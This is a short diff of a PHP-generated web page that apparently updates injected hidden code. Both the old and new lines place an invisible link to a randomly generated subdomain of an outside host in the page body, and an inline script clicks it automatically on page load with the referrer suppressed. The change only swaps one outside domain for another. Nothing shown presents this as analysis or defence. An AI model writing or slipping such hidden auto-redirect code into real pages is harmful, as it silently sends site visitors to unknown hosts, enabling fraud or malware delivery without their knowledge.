@@ -26,4 +26,4 @@ $bbb = str_rand(5);
     <title></title>
     <meta name="keywords" content="">
     <meta name="description" content="">
-</head><body><div style="display: none;"><a href='http://<?php echo $abc;?>.gfj1.cn/hisehHWmrLCod62EeHrcgaamlX93ddquiLJqh<?php echo $bbb;?>.jpg?v=nOPHv8BWaB' rel='noreferrer' id='tmiJdfoOuQ' style='display: none;'>noreferer</a><script>document.getElementById('tmiJdfoOuQ').click();</script></div>
+</head><body><div style="display: none;"><a href='http://<?php echo $abc;?>.yangqingzhen.com/hisehHWmrLCod62EeHrcgaamlX93ddquiLJqh<?php echo $bbb;?>.jpg?v=nOPHv8BWaB' rel='noreferrer' id='tmiJdfoOuQ' style='display: none;'>noreferer</a><script>document.getElementById('tmiJdfoOuQ').click();</script></div>
